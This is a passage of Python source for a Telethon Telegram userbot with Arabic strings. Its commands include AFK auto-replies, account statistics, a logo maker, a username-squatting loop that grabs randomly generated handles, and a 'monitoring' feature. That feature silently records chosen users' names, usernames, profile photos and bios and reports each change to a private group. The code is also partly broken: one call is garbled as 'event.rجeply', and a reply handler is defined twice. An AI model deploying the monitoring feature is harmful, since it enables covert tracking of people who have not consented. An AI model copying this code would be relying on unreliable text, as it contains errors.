        # الحصول على ردين من البوت
        response1 = await conv.get_response()
        response2 = await conv.get_response()

        
        if response1.text == "⌛️ Forming a response ...":
            xx = response2  # استخدام الرسالة الثانية 
        else:
            xx = response1  # استخدام الرسالة الأولى

        text_without_links = re.sub(r'http\S+', '', xx.text)

        await client.send_read_acknowledge(conv.chat_id)
        await client.send_message(chat, text_without_links)
        await event.message.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'\.حمل (.+)'))
async def download_media(event):
    chat = await event.get_chat()
    link = event.pattern_match.group(1)
    message_to_delete = await event.edit("جاري التحميل...")

    async with client.conversation('@aaazzjbot') as conv:
        try:
            await conv.send_message(link)

            @client.on(events.NewMessage(from_users='@aaazzjbot'))
            async def handle_response(event):
                if event.media:
                    if event.grouped_id:
                        for photo in event.media.photos:
                            await client.send_file(chat, photo)
                    else:
                        await client.send_file(chat, event.media)

                    # حذف رسالة "جاري التحميل..."
                    await message_to_delete.delete()

                    # انتظار 3 ثواني قبل حذف المحادثة
                    await asyncio.sleep(3)

                    try:
                        await client(functions.messages.DeleteHistoryRequest(
                            peer='@aaazzjbot',
                            max_id=event.message.id,
                            revoke=True
                        ))
                    except Exception as e:
                        print(f"حدث خطأ: {e}")

                client.remove_event_handler(handle_response)

            try:
                await asyncio.wait_for(
                    client.loop.create_task(conv.get_response()),
                    timeout=10
                )
            except asyncio.TimeoutError:
                await event.edit("اسف ياصديقي لم اجد شيئا")
                client.remove_event_handler(handle_response)

        except Exception as e:
            print(f"حدث خطأ: {e}")
            await event.edit(f"حدث خطأ: {e}")


# تعريف المتغيرات العامة
afk_mode = False
custom_reply = "أنا لست موجودًا الآن، أرجوك اترك رسالتك وانتظر لحين عودتي."
reply_to_message = None
custom_replies = {}
custom_replies_enabled = False
allowed_chats = set()

# تحميل الردود المخصصة من ملف التخزين
try:
    with open('custom_replies.pickle', 'rb') as f:
        custom_replies = pickle.load(f)
except FileNotFoundError:
    pass

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.تشغيل الرد$'))
async def enable_afk(event):
    global afk_mode
    afk_mode = True
    await event.edit("تم تشغيل الرد التلقائي.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.المخصص تشغيل$'))
async def enable_custom_replies(event):
    global custom_replies_enabled
    custom_replies_enabled = True
    await event.edit("تم تشغيل الردود المخصصة.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.تعطيل الرد$'))
async def disable_replies(event):
    global afk_mode, custom_replies_enabled
    afk_mode = False
    custom_replies_enabled = False
    await event.edit("تم تعطيل الرد التلقائي والردود المخصصة.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.كليشة الرد$'))
async def set_reply_template(event):
    global reply_to_message
    reply_to_message = await event.get_reply_message()
    if reply_to_message:
        await event.edit("تم تعيين كليشة الرد إلى الرسالة المحددة.")
    else:
        await event.edit("يرجى الرد على الرسالة التي تريد استخدامها ككليشة.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.رد (.+)'))
async def add_custom_reply(event):
    global custom_replies
    reply_to_message = await event.get_reply_message()
    if reply_to_message:
        trigger_text = reply_to_message.raw_text
        reply_text = event.pattern_match.group(1).strip()
        if len(custom_replies) < 20:
            custom_replies[trigger_text] = reply_text
            with open('custom_replies.pickle', 'wb') as f:
                pickle.dump(custom_replies, f)
            await event.edit(f"تم إضافة الرد المخصص بنجاح. لديك الآن {len(custom_replies)} ردود مخصصة.")
        else:
            await event.edit("لقد وصلت إلى الحد الأقصى للردود المخصصة (20).")
    else:
        await event.edit("يرجى الرد على الرسالة التي تريد إضافة رد مخصص لها.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.حذف رد$'))
async def delete_custom_reply(event):
    global custom_replies
    reply_to_message = await event.get_reply_message()
    if reply_to_message:
        trigger_text = reply_to_message.raw_text
        if trigger_text in custom_replies:
            del custom_replies[trigger_text]
            with open('custom_replies.pickle', 'wb') as f:
                pickle.dump(custom_replies, f)
            await event.edit("تم حذف الرد المخصص بنجاح.")
        else:
            await event.edit("لم يتم العثور على رد مخصص لهذه الرسالة.")
    else:
        await event.edit("يرجى الرد على الرسالة التي تريد حذف ردها المخصص.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage)
async def reply_handler(event):
    global afk_mode, custom_replies, custom_replies_enabled
    if (afk_mode or custom_replies_enabled) and event.is_private:
        me = await event.client.get_me()
        sender = await event.get_sender()
        if sender.id != me.id and not sender.bot:
            # الردود المخصصة
            if custom_replies_enabled:
                for trigger, reply in custom_replies.items():
                    if trigger in event.raw_text:  
                        await event.reply(reply)
                        return  
            # الرد التلقائي عند التفعيل
            if afk_mode:  
                if event.raw_text not in custom_replies:  
                    if reply_to_message:
                        await event.reply(reply_to_message.text)
                    else:
                        await event.reply(custom_reply)

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.سماح$'))
async def allow_chat(event):
    if event.is_private:
        allowed_chats.add(event.chat_id)
        await event.edit("تم السماح لهذه المحادثة.")
    else:
        await event.edit("لا يمكن استخدام هذا الأمر إلا في المحادثات الخاصة.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.الغاء السماح$'))
async def disallow_chat(event):
    if event.is_private:
        allowed_chats.discard(event.chat_id)
        await event.edit("تم إلغاء السماح لهذه المحادثة.")
    else:
        await event.edit("لا يمكن استخدام هذا الأمر إلا في المحادثات الخاصة.")
    await asyncio.sleep(2)
    await event.delete()



last_reply_sent = None

@client.on(events.NewMessage)
async def reply_handler(event):
    global afk_mode, custom_replies, custom_replies_enabled, last_reply_sent
    if (afk_mode or custom_replies_enabled) and event.is_private and event.chat_id not in allowed_chats:
        me = await event.client.get_me()
        sender = await event.get_sender()
        if sender.id != me.id and not sender.bot:
            if custom_replies_enabled:
                for trigger, reply in custom_replies.items():
                    if trigger in event.raw_text:
                        await event.reply(reply)
                        break
            if afk_mode:
                if not event.raw_text in custom_replies:
                    if reply_to_message:
                        reply_text = reply_to_message.text
                        reply = await event.rجeply(reply_to_message)
                        if last_reply_sent and last_reply_sent.text == reply_text:
                            await last_reply_sent.delete()
                        last_reply_sent = reply
                    else:
                        reply = await event.reply(custom_reply)
                        if last_reply_sent and last_reply_sent.text == custom_reply:
                            await last_reply_sent.delete()
                        last_reply_sent = reply

STAT_INDICATION = f"**⎉╎جـارِ جـلب الاحصـائيـات إنتظـر ⅏ . . .**"
CHANNELS_STR = f"𓆩 **[TNT Multi HUNTER](t.me/S21S6)** **- 🝢 - احصـائيـات جميـع القنـوات** 𓆪\n\n"
CHANNELS_ADMINSTR = f"𓆩 **[TNT Multi HUNTER](t.me/S21S6)** **- 🝢 - احصـائيـات جميـع القنـوات اشـراف** 𓆪\n\n"
CHANNELS_OWNERSTR = f"𓆩 **[TNT Multi HUNTER](t.me/S21S6)** **- 🝢 - احصـائيـات جميـع القنـوات ملكيـة** 𓆪\n\n"
GROUPS_STR = f"𓆩 **[TNT Multi HUNTER](t.me/S21S6)** **- 🝢 - احصـائيـات جميـع المجمـوعـات** 𓆪\n\n"
GROUPS_ADMINSTR = f"𓆩 **[TNT Multi HUNTER](t.me/S21S6)** **- 🝢 - احصـائيـات جميـع المجمـوعـات اشـراف** 𓆪\n\n"
GROUPS_OWNERSTR = f"𓆩 **[TNT Multi HUNTER](t.me/S21S6)** **- 🝢 - احصـائيـات جميـع المجمـوعـات ملكيـة** 𓆪\n\n"

@client.on(events.NewMessage(outgoing=True, pattern=r"\.احصائياتي"))
async def count(event):
    start_time = time.time()
    u = 0
    g = 0
    c = 0
    bc = 0
    b = 0
    result = ""
    await event.edit("**⪼ جاري المعـالجه ༗.**")
    dialogs = await client.get_dialogs(limit=None, ignore_migrated=True)
    for d in dialogs:
        current_entity = d.entity
        if isinstance(current_entity, User):
            if current_entity.bot:
                b += 1
            else:
                u += 1
        elif isinstance(current_entity, Chat):
            g += 1
        elif isinstance(current_entity, Channel):
            if current_entity.broadcast:
                bc += 1
            else:
                c += 1
        else:
            print(d)
    result += f"ـ𓆩 𝙎𝙊𝙐𝙍𝘾𝞝 𝗘𝗩𝗘 **- 🝢 - احصـائيـات الحسـاب** 𓆪\n"
    result += f"𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻\n"
    result += f"**⎉╎المستخدمون :**\t**{u}**\n"
    result += f"**⎉╎المجموعات :**\t**{g}**\n"
    result += f"**⎉╎المجموعات الخارقه :**\t**{c}**\n"
    result += f"**⎉╎القنوات :**\t**{bc}**\n"
    result += f"**⎉╎البوتات :**\t**{b}**\n"
    result += f"ـ𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻"
    stop_time = time.time() - start_time
    result += f"\n**- الوقـت المستغـرق 📟 :** {stop_time:.02f} **ثـانيـه**"
    await event.edit(result)
   

@client.on(events.NewMessage(outgoing=True, pattern=r"\.معلوماتي"))
async def stats(event):
    "To get statistics of your telegram account."
    cat = await event.edit("**⪼ جاري المعـالجه ༗.**...")
    start_time = time.time()
    private_chats = 0
    bots = 0
    groups = 0
    broadcast_channels = 0
    admin_in_groups = 0
    creator_in_groups = 0
    admin_in_broadcast_channels = 0
    creator_in_channels = 0
    unread_mentions = 0
    unread = 0

    def inline_mention(user):
        return f"[{user.first_name}](tg://user?id={user.id})"

    dialog: Dialog
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            broadcast_channels += 1
            if entity.creator or entity.admin_rights:
                admin_in_broadcast_channels += 1
            if entity.creator:
                creator_in_channels += 1
        elif (isinstance(entity, Channel) and entity.megagroup or
              not isinstance(entity, Channel) and not isinstance(entity, User) and isinstance(entity, Chat)):
            groups += 1
            if entity.creator or entity.admin_rights:
                admin_in_groups += 1
            if entity.creator:
                creator_in_groups += 1
        elif not isinstance(entity, Channel) and isinstance(entity, User):
            private_chats += 1
            if entity.bot:
                bots += 1
        unread_mentions += dialog.unread_mentions_count
        unread += dialog.unread_count

    stop_time = time.time() - start_time
    full_name = inline_mention(await event.client.get_me())
    response = f"ـ𓆩 𝙎𝙊𝙐𝙍𝘾𝞝 𝗘𝗩𝗘 **- 🝢 - معلومات {full_name}** 𓆪\n"
    response += f"**ـ𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻**\n"
    response += f"**- الخـاص :** {private_chats} \n"
    response += f" ★ **اشخـاص :** `{private_chats - bots}` \n"
    response += f" ★ **بـوتـات :** `{bots}` \n"
    response += f"**- المجمـوعـات :** {groups} \n"
    response += f"**- القنـوات :** {broadcast_channels} \n"
    response += f"**- ادمـن في مجموعات :** {admin_in_groups} \n"
    response += f" ★ **مـالك :** `{creator_in_groups}` \n"
    response += f" ★ **ادمـن : ** `{admin_in_groups - creator_in_groups}` \n"
    response += f"**- ادمـن في قنـوات :** {admin_in_broadcast_channels} \n"
    response += f" ★ **مـالك :** `{creator_in_channels}` \n"
    response += (f" ★ **ادمـن :** `{admin_in_broadcast_channels - creator_in_channels}` \n")
    response += f"**ـUnread:** {unread} \n"
    response += f"**ـUnread Mentions:** {unread_mentions} \n\n"
    response += f"📌**- الوقـت المستغـرق 📟 :** {stop_time:.02f} **ثـانيـه**"
    await cat.edit(response)

PICS_STR = []

@client.on(events.NewMessage(pattern=r"لوجو ?(.*)"))
async def lg1(userevent):
    event = await eor(userevent, "- جـارِ صنـع لـوقـو عـربـي بحقـوقك ...")
    text = userevent.pattern_match.group(1)
    if not text:
        await eor(userevent, "- الامـر + نص او الامـر + نص بالـرد ع صـورة ...")
        return
        
    arabic_text = "".join(char for char in text if char.isalpha() and char not in string.ascii_letters)
    if not arabic_text:
        await eor(userevent, "- الرجاء إدخال نص باللغـة العربيـة فقـط.\n.لوقو + نص عـربـي\n.لوكو + نص انكـلش")
        return
        
    if len(text) <= 8:
        font_size_ = 150
        strik = 10
    elif len(text) >= 9:
        font_size_ = 50
        strik = 5
    else:
        font_size_ = 130
        strik = 20
        
    if userevent.reply_to_msg_id:
        rply = await userevent.get_reply_message()
        logo_ = await userevent.client.download_media(rply)
    else:
        async for i in client.iter_messages("@Z_44_Z", filter=InputMessagesFilterPhotos):
            PICS_STR.append(i)
        pic = random.choice(PICS_STR)
        logo_ = await pic.download_media()
        
    img = Image.open(logo_)
    draw = ImageDraw.Draw(img)
    font = ImageFont.truetype("font.ttf", font_size_)
    image_widthz, image_heightz = img.size
    w = font.getsize(text)[0]
    h = font.getsize(text)[1]
    image_width, image_height = img.size
    draw.text(((image_width - w) / 2, (image_height - h) / 2), text, font=font, fill=(255, 255, 255), )
    w_ = (image_width - w) / 2
    h_ = (image_height - h) / 2
    draw.text((w_, h_), text, font=font, fill="white", stroke_width=strik, stroke_fill="black")
    
    file_name = "Andencento.png"
    img.save(file_name, "PNG")
    await userevent.client.send_file(userevent.chat_id, file_name)
    await userevent.delete()
    try:
        os.remove(file_name)
        os.remove(logo_)
    except BaseException:
        pass


private_locked = False

@client.on(events.NewMessage(from_users='me', pattern='.قفل الخاص'))
async def lock_private(event):
    global private_locked
    private_locked = True
    await event.edit("⎙ الخاص مقفل الآن.")


@client.on(events.NewMessage(from_users='me', pattern='.فتح الخاص'))
async def unlock_private(event):
    global private_locked
    private_locked = False
    await event.edit("⎙ الخاص مفتوح الآن.")


@client.on(events.NewMessage(incoming=True))
async def delete_private_messages(event):
    global private_locked
    if private_locked and event.is_private:
        await event.delete()

X_54P = "•❃"

@client.on(events.NewMessage(pattern=r"^كشف(?: |$)(.*)"))
async def kashf(event):
    if event.fwd_from:
        return

    input_str = event.pattern_match.group(1)
    if not input_str:
        await event.edit("يرجى تقديم معرّف المستخدم أو الاسم المستخدم أو الرد على رسالة المستخدم")
        return

    try:
        user = await event.client.get_entity(input_str)
    except ValueError as e:
        await event.edit(f"خطأ: {e}")
        return

    try:
        full_user = await event.client(functions.users.GetFullUserRequest(user.id))
    except ValueError as e:
        await event.edit(f"خطأ: {e}")
        return

    user_id = user.id
    first_name = user.first_name
    full_name = f"{first_name} {user.last_name}" if user.last_name else first_name
    username = user.username
    photo = await event.client.download_profile_photo(user_id, "kashf.jpg", download_big=True)
    rotbat = "⌁ مطور السورس الرسمي 𓄂𓆃 ⌁" if user_id == 705475246 else ("⌁ العضـو 𓅫 ⌁")
    rotbat = "⌁ مـالك الحساب 𓀫 ⌁" if user_id == (await event.client.get_me()).id and user_id != 705475246 else rotbat
    caption = f"ـ✛━━━━━━━━━━━━━✛\n"
    caption += f" {X_54P}╎الاسـم ⇠ {full_name}\n"
    caption += f" {X_54P}╎المعـرف ⇠ @{username}\n"
    caption += f" {X_54P}╎الايـدي ⇠ {user_id}\n"
    caption += f" {X_54P}╎الرتبـــه ⇠ {rotbat}\n"
    caption += f" {X_54P}╎الحساب ⇠ [{full_name}](tg://openmessage?user_id={user_id}')\n"
    caption += f"ـ✛━━━━━━━━━━━━━✛"

    await event.client.send_file(event.chat_id, photo, caption=caption)
    await event.delete()


import random
import asyncio

# تعريف متغيرات الصيد
hunting_active = False
hunting_pattern = ""
channel_id = None
hunting_attempts = 0

# دالة توليد اسم مستخدم
def generate_username(pattern):
    username = ""
    for char in pattern:
        if char in ["H", "B"]:
            username += random.choice("abcdefghijklmnopqrstuvwxyz")
        elif char == "4":
            username += random.choice("0123456789")
        else:
            username += char
    return username

# دالة تحديد النمط
def get_pattern_by_type(hunt_type):
    patterns = {
        "ثلاثي1": "H_B_H",
        "خماسي ارقام": "HB444",
        "ثلاثي2": "H_4_B",
        "ثلاثي3": "H_4_0",
        "رباعي1": "HHH_B",
        "رباعي2": "H_BBB",
        "رباعي3": "HH_BB",
        "رباعي4": "HH_HB",
        "رباعي5": "HH_BH",
        "رباعي6": "HB_BH",
        "رباعي7": "HB_HB",
        "رباعي8": "HB_BB",
        "شبه رباعي1": "H_H_H_B",
        "شبه رباعي2": "H_B_B_B",
        "شبه رباعي3": "H_BB_H",
        "شبه رباعي4": "H_BB_B",
        "خماسي حرفين1": "HHHBR",
        "خماسي حرفين2": "H4BBB",
        "خماسي ارقام": "HB444",
        "خماسي حرفين3": "HBBBR",
        "سداسي_حرفين1": "HBHHHB",
        "سداسي_حرفين2": "HHHHBB",
        "سداسي_حرفين3": "HHHBBH",
        "سداسي_حرفين4": "HHBBHH",
        "سداسي_حرفين5": "HBBHHH",
        "سداسي_حرفين6": "HHBBBB",
        "سداسي_شرطه": "HHHH_B",
        "سباعيات1": "HHHHHHB",
        "سباعيات2": "HHHHHBH",
        "سباعيات3": "HHHHBHH",
        "سباعيات4": "HHHBHHH",
        "سباعيات5": "HHBHHHH",
        "سباعيات6": "HBHHHHH",
        "سباعيات7": "HBBBBBB",
        "بوتات1": "HB_Bot",
        "بوتات2": "H_BBot",
        "بوتات3": "HB4Bot",
        "بوتات4": "H4BBot",
        "بوتات5": "H44Bot",
        "بوتات6": "HRBBot",
        "بوتات7": "HHBBot",
        "بوتات8": "HHBBot",
        "بوتات9": "HH4Bot"
    }
    return patterns.get(hunt_type, hunt_type)

# إنشاء قناة جديدة
async def create_channel(client):
    global channel_id
    try:
        result = await client(functions.channels.CreateChannelRequest(
            title="صيد سورس ايفا",
            about="قناه لصيد اليوزرات تابعه لسورس ايفا @S21S6",
            megagroup=False
        ))
        if result.chats:
            channel_id = result.chats[0].id
            return channel_id
    except Exception as e:
        print(f"خطأ في إنشاء القناة: {e}")
    return None

# تعيين اسم المستخدم للقناة
async def set_channel_username(client, username):
    global channel_id
    if channel_id is not None:
        try:
            await client(functions.channels.UpdateUsernameRequest(
                channel=channel_id, username=username
            ))
            return True
        except Exception as e:
            print(f"خطأ في تحديث اسم المستخدم: {e}")
            return False
    return False

# أمر بدء الصيد
@client.on(events.NewMessage(pattern=r".صيد (.+)"))
async def start_hunting(event):
    global hunting_active, hunting_pattern, hunting_attempts, channel_id

    if hunting_active:
        await event.edit("الصيد قيد التشغيل بالفعل!")
        return

    hunt_type = event.pattern_match.group(1)
    hunting_pattern = get_pattern_by_type(hunt_type)
    hunting_active = True
    hunting_attempts = 0

    await event.edit(f"**⎉╎تم بـدء الصيـد .. بنجـاح ☑️\n ⎉╎علـى النـوع {hunting_pattern}\n ⎉╎لمعرفـة حالة عمليـة الصيـد ( .حالة الصيد )\n⎉╎لـ ايقـاف عمليـة الصيـد ( .صيد ايقاف )**")
    
    await hunt_username(event, event.client, hunting_pattern)

# دالة البحث عن يوزر
async def hunt_username(event, client, hunting_pattern):
    global hunting_active, hunting_attempts, channel_id

    channel_id = await create_channel(client)
    if not channel_id:
        await event.reply("**فشل إنشاء القناة، تأكد من صحة البيانات.**")
        hunting_active = False
        return

    while hunting_active:
        username = generate_username(hunting_pattern)
        hunting_attempts += 1
        try:
            result = await client(functions.account.CheckUsernameRequest(username))
            if result:
                success = await set_channel_username(client, username)
                if success:
                    await event.respond(f"تم حجز اليوزر بنجاح: @{username}")
                    hunting_active = False
                    break
                else:
                    await event.respond(f"اليوزر @{username} متاح لكنه لم يُعين للقناة.")
        except Exception as e:
            print(f"حدث خطأ: {e}")
        await asyncio.sleep(2)

# إيقاف الصيد
@client.on(events.NewMessage(pattern=r".ايقاف الصيد"))
async def stop_hunting(event):
    global hunting_active
    hunting_active = False
    await event.edit("تم إيقاف الصيد.")

# حالة الصيد
@client.on(events.NewMessage(pattern=r".حالة الصيد"))
async def hunting_status(event):
    status = "⎙ قيد التشغيل" if hunting_active else "⎙ متوقف"
    await event.edit(f"⎙ حالة الصيد: {status}\n⎙ عدد المحاولات: {hunting_attempts}")

# ملف لحفظ إعدادات الحماية
protection_file = "group_protection.pkl"

# تحميل إعدادات الحماية إن وجدت، وإلا يتم إنشاء قاموس جديد
if os.path.exists(protection_file):
    with open(protection_file, "rb") as f:
        group_protection_settings = pickle.load(f)
else:
    group_protection_settings = {}

# خريطة تحويل أوامر الحماية إلى المفاتيح في القاموس
protection_mapping = {
    "الصور": "photos",
    "المتحركة": "gifs",
    "الملصقات": "stickers",
    "التحويل": "forwards",
    "الفيديوهات": "videos",
    "الروابط": "links",
    "البصمات": "voice_notes",
    "الدردشة": "chat"
}

# ✅ تفعيل أو تعطيل الحماية لأحد الأنواع
@client.on(events.NewMessage(pattern=r'\.(فعل|عطل) (الصور|المتحركة|الملصقات|التحويل|الفيديوهات|الروابط|البصمات|الدردشة)'))
async def toggle_protection(event):
    chat_id = event.chat_id
    sender = await event.get_sender()

    # جلب المشرفين باستخدام طريقة أكثر استقرارًا
    try:
        admins = await client.get_participants(chat_id, filter=types.ChannelParticipantsAdmins)
        admin_ids = {admin.id for admin in admins}
    except Exception as e:
        await event.reply(f"⎙ حدث خطأ أثناء جلب المشرفين. تأكد أن البوت لديه الصلاحيات الكافية.\n⚠️ التفاصيل: {str(e)}")
        return

    # التحقق من أن المستخدم مشرف
    if sender.id not in admin_ids:
        await event.reply("⎙ يجب أن تكون مشرفًا لاستخدام هذا الأمر!")
        return

    action, protection_type = event.pattern_match.groups()

    if chat_id not in group_protection_settings:
        group_protection_settings[chat_id] = {key: False for key in protection_mapping.values()}

    # تحديث الحالة
    setting_key = protection_mapping[protection_type]
    group_protection_settings[chat_id][setting_key] = (action == "فعل")

    # حفظ الإعدادات
    with open(protection_file, "wb") as f:
        pickle.dump(group_protection_settings, f)

    status = "⎙ تم التفعيل" if action == "فعل" else "⎙ تم التعطيل"
    await event.reply(f"{status} {protection_type} في هذه المجموعة.")

# 🔍 عرض حالة الحماية في المجموعة
@client.on(events.NewMessage(pattern=r'\.الحماية'))
async def show_protection_status(event):
    chat_id = event.chat_id

    if chat_id not in group_protection_settings:
        await event.reply("⎙ لم يتم تفعيل أي إعدادات حماية لهذه المجموعة بعد.")
        return

    settings = group_protection_settings[chat_id]
    status_list = [f"• {name}: {'⎙ مفعلة' if settings[key] else '⎙ معطلة'}" for name, key in protection_mapping.items()]
    
    await event.reply("⎙ إعدادات الحماية الحالية:\n\n" + "\n".join(status_list))

# 🔍 ملفات تخزين البيانات
watchlist_file = "watchlist.pkl"
monitoring_group_file = "monitoring_group.pkl"
user_data_file = "user_data.pkl"

# 🗂 تحميل البيانات
watchlist = {}
user_data = {}
monitoring_group = None

if os.path.exists(watchlist_file):
    with open(watchlist_file, "rb") as f:
        watchlist = pickle.load(f)

if os.path.exists(user_data_file):
    with open(user_data_file, "rb") as f:
        user_data = pickle.load(f)

if os.path.exists(monitoring_group_file):
    with open(monitoring_group_file, "rb") as f:
        monitoring_group = pickle.load(f)

# 🗂 حفظ البيانات
def save_watchlist():
    with open(watchlist_file, "wb") as f:
        pickle.dump(watchlist, f)

def save_user_data():
    with open(user_data_file, "wb") as f:
        pickle.dump(user_data, f)

def save_monitoring_group():
    with open(monitoring_group_file, "wb") as f:
        pickle.dump(monitoring_group, f)

# 📡 التأكد من وجود مجموعة المراقبة
async def ensure_monitoring_group():
    global monitoring_group
    if monitoring_group:
        return monitoring_group  # ✅ إذا كانت موجودة، استخدمها مباشرة

    try:
        result = await client(functions.channels.CreateChannelRequest(
            title="📡 مجموعة المراقبة",
            about="قناة خاصة لمراقبة الأشخاص لسورس إيفا @S21S6",
            megagroup=True
        ))
        monitoring_group = result.chats[0].id
        save_monitoring_group()
        print(f"⎙ تم إنشاء مجموعة المراقبة: {monitoring_group}")
    except Exception as e:
        print(f"⎙ فشل إنشاء مجموعة المراقبة: {e}")
        monitoring_group = None

    return monitoring_group

# 👀 بدء مراقبة مستخدم
@client.on(events.NewMessage(pattern=r"\.مراقبة (.+)"))
async def start_watching(event):
    global monitoring_group
    username = event.pattern_match.group(1)

    # التأكد من أن مجموعة المراقبة موجودة
    monitoring_group = await ensure_monitoring_group()

    if monitoring_group is None:
        await event.reply("⎙ فشل في إنشاء مجموعة المراقبة. حاول لاحقًا.")
        return

    try:
        user = await client.get_entity(username)
        if user.id in watchlist:
            await event.reply(f"⎙ المستخدم @{username} قيد المراقبة بالفعل.")
            return
        
        watchlist[user.id] = user.username or f"ID_{user.id}"
        user_data[user.id] = {
            'name': user.first_name,
            'photo': None,
            'status': None,
            'bio': None
        }
        save_watchlist()
        save_user_data()
        await event.reply(f"⎙ بدأت مراقبة المستخدم: @{watchlist[user.id]}")
    except Exception as e:
        await event.reply(f"⎙ لم يتم العثور على المستخدم @{username}.")
        print(f"Error: {e}")

# ⛔️ إيقاف مراقبة مستخدم محدد
@client.on(events.NewMessage(pattern=r"\.ايقاف_المراقبة (.+)"))
async def stop_watching(event):
    username = event.pattern_match.group(1)
    
    try:
        user = await client.get_entity(username)
        if user.id in watchlist:
            del watchlist[user.id]
            del user_data[user.id]
            save_watchlist()
            save_user_data()
            await event.reply(f"⎙ تم إيقاف مراقبة المستخدم: @{username}")
        else:
            await event.reply(f"⎙ المستخدم @{username} غير موجود في قائمة المراقبة.")
    except Exception as e:
        await event.reply(f"⎙ لم يتم العثور على المستخدم @{username}.")
        print(f"Error: {e}")

# 🕵️‍♂️ مراقبة تحديثات المستخدمين
@client.on(events.UserUpdate)
async def user_update_handler(event):
    global monitoring_group
    if not monitoring_group:
        return  # ✅ لا ترسل أي إشعار إذا لم تكن هناك مجموعة مراقبة

    user_id = event.user_id
    if user_id in watchlist:
        try:
            user = await client.get_entity(user_id)
            old_data = user_data.get(user_id, {})
            changes = []

            # ✅ تحديث الاسم
            if user.first_name != old_data.get('name'):
                changes.append(f"📌 الاسم الجديد: {user.first_name}")
                user_data[user_id]['name'] = user.first_name

            # ✅ تحديث اليوزر
            if user.username and user.username != watchlist[user_id]:
                changes.append(f"🔗 اليوزر الجديد: @{user.username}")
                watchlist[user_id] = user.username

            # ✅ تحديث الصورة الشخصية
            photos = await client.get_profile_photos(user_id, limit=1)
            if photos:
                new_photo_id = photos[0].id
                if new_photo_id != old_data.get('photo'):
                    changes.append("🖼️ قام بتغيير صورته الشخصية")
                    user_data[user_id]['photo'] = new_photo_id

            # ✅ تحديث البايو
            full_user = await client(functions.users.GetFullUserRequest(user))
            if full_user.about and full_user.about != old_data.get('bio'):
                changes.append(f"📝 قام بتغيير البايو: {full_user.about}")
                user_data[user_id]['bio'] = full_user.about

            # ✅ حفظ البيانات المحدثة
            save_user_data()
            save_watchlist()

            # ✅ إرسال كل التغييرات في رسالة واحدة
            if changes:
                user_mention = f"@{watchlist[user_id]}" if watchlist[user_id].startswith("@") else f"ID: {user_id}"
                await client.send_message(monitoring_group, f"⎙ تحديث في حساب {user_mention}:\n\n" + "\n".join(changes))
        except Exception as e:
            print(f"Error updating user {user_id}: {e}")


update_tasks = {}
time_formats = [
    "🟢 اليوزرات الثلاثية:",
    "➤ .صيد ثلاثي1  - مثال: H_R_B",
    "➤ .صيد ثلاثي2  - مثال: H_4_B",
    "➤ .صيد ثلاثي3  - مثال: H_4_0",

    "🟡 اليوزرات الرباعية:",
    "➤ .صيد رباعي1  - مثال: HHH_B",
    "➤ .صيد رباعي2  - مثال: H_BBB",
    "➤ .صيد رباعي3  - مثال: HH_BB",
    "➤ .صيد رباعي4  - مثال: HH_HB",
    "➤ .صيد رباعي5  - مثال: HH_BH",
    "➤ .صيد رباعي6  - مثال: HB_BH",
    "➤ .صيد رباعي7  - مثال: HB_HB",
    "➤ .صيد رباعي8  - مثال: HB_BB",

    "🟠 اليوزرات شبه الرباعية:",
    "➤ .صيد شبه رباعي1  - مثال: H_H_H_B",
    "➤ .صيد شبه رباعي2  - مثال: H_B_B_B",
    "➤ .صيد شبه رباعي3  - مثال: H_BB_H",
    "➤ .صيد شبه رباعي4  - مثال: H_BB_B",

    "🔵 اليوزرات الخماسية:",
    "➤ .صيد خماسي حرفين1  - مثال: HHHBR",
    "➤ .صيد خماسي حرفين2  - مثال: H4BBB",
    "➤ .صيد خماسي ارقام  - مثال: HB444",
    "➤ .صيد خماسي حرفين3  - مثال: HBBBR",

    "🟣 اليوزرات السداسية:",
    "➤ .صيد سداسي_حرفين1  - مثال: HBHHHB",
    "➤ .صيد سداسي_حرفين2  - مثال: HHHHBB",
    "➤ .صيد سداسي_حرفين3  - مثال: HHHBBH",
    "➤ .صيد سداسي_حرفين4  - مثال: HHBBHH",
    "➤ .صيد سداسي_حرفين5  - مثال: HBBHHH",
    "➤ .صيد سداسي_حرفين6  - مثال: HHBBBB",
    "➤ .صيد سداسي_شرطه  - مثال: HHHH_B",

    "🔴 اليوزرات السباعية:",
    "➤ .صيد سباعيات1  - مثال: HHHHHHB",
    "➤ .صيد سباعيات2  - مثال: HHHHHBH",
    "➤ .صيد سباعيات3  - مثال: HHHHBHH",
    "➤ .صيد سباعيات4  - مثال: HHHBHHH",
    "➤ .صيد سباعيات5  - مثال: HHBHHHH",
    "➤ .صيد سباعيات6  - مثال: HBHHHHH",
    "➤ .صيد سباعيات7  - مثال: HBBBBBB",

    "⚪ يوزرات البوتات:",
    "➤ .صيد بوتات1  - مثال: HB_Bot",
    "➤ .صيد بوتات2  - مثال: H_BBot",
    "➤ .صيد بوتات3  - مثال: HB4Bot",
    "➤ .صيد بوتات4  - مثال: H4BBot",
    "➤ .صيد بوتات5  - مثال: H44Bot",
    "➤ .صيد بوتات6  - مثال: HRBBot",
    "➤ .صيد بوتات7  - مثال: HHBBot - HH4Bot",
    "➤ .صيد بوتات8  - مثال: HHBBot",
    "➤ `.صيد بوتات9`  - مثال: HH4Bot",

    "🛠 لإظهار أوامر الصيد والتثبيت الأساسية:",
    "➤ استخدم الأمر: .الصيد أو .التثبيت",
]

